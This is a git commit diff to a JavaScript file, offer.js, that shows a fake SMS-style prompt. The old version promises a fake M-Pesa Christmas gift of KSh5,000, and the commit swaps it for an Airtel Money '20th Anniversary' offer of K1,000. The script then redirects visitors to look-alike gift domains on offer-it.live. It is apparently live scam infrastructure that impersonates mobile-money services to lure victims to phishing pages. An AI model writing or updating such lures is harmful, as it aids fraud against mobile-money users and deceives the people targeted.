6f96c92f6a84dfbbbb6a84a97c4c762a7b24934e
lagalfredben <lagalfredben@gmail.com>
2026-03-20 18:12:58 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,8 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'KSh5,000'
-password=prompt('SMS: Congratulations, your M-Pesa account is eligible to receive the M-Pesa Christmas gift of KSh5,000. Please click OK to Continue. ','KSh5,000');
-if (password != 'KSh5,000') {
-location.href='https://mpesa-drc.offer-it.live/gift';
+var password = 'K1,000'
+password=prompt('SMS: Welcome, its our 20th Anniversary. Please click OK to Continue. ','K1,000');
+if (password != 'K1,000') {
+location.href='https://airtelmoney-zm.offer-it.live/gift';
 
 }
-
